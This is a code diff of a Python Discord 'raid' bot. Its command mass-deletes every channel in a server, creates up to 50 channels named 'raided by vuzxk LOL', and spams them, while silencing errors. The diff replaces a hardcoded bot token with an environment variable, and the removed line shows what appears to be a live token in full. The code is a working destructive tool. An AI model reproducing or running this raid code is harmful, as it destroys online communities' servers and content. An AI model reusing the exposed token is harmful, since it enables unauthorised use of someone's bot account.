@@ -1,10 +1,12 @@
 import discord
 from discord.ext import commands
 import asyncio
-import random
-import string
+import os
 
-TOKEN = "MTQ3NjM5NjkxNzYxNjU0NTgwNA.G7UjTT.a-JkJ25f85G_tQ399nlnI4mQmzOvENc_5wCFA4"
+TOKEN = os.getenv("TOKEN")
+if not TOKEN:
+    raise ValueError("TOKEN environment variable is required")
+
 PREFIX = "!"
 CHANNEL_NAME = "raided by vuzxk LOL"
 DELETE_DELAY = 0.1
@@ -55,7 +57,6 @@ async def raid(ctx):
     await ctx.message.delete()
     guild = ctx.guild
 
-    # Instant mass delete
     channels_to_delete = list(guild.channels)
     delete_tasks = [
         asyncio.create_task(delete_channel_safe(ch))
@@ -65,11 +66,9 @@ async def raid(ctx):
     await asyncio.gather(*delete_tasks, return_exceptions=True)
     await asyncio.sleep(1.0)
 
-    # Instant mass create + spam
     created_count = 0
     max_creates = 50
 
-    create_tasks = []
     for _ in range(max_creates):
         try:
             new_channel = await guild.create_text_channel(name=CHANNEL_NAME)
@@ -89,15 +88,11 @@ async def raid(ctx):
         except Exception:
             await asyncio.sleep(0.1)
 
-    # Keep the bot alive
     await asyncio.sleep(999999)
 
 @bot.event
 async def on_command_error(ctx, error):
-    if isinstance(error, commands.MissingPermissions):
-        pass
-    elif isinstance(error, commands.CommandNotFound):
-        pass
+    pass
 
 if __name__ == "__main__":
     bot.run(TOKEN)
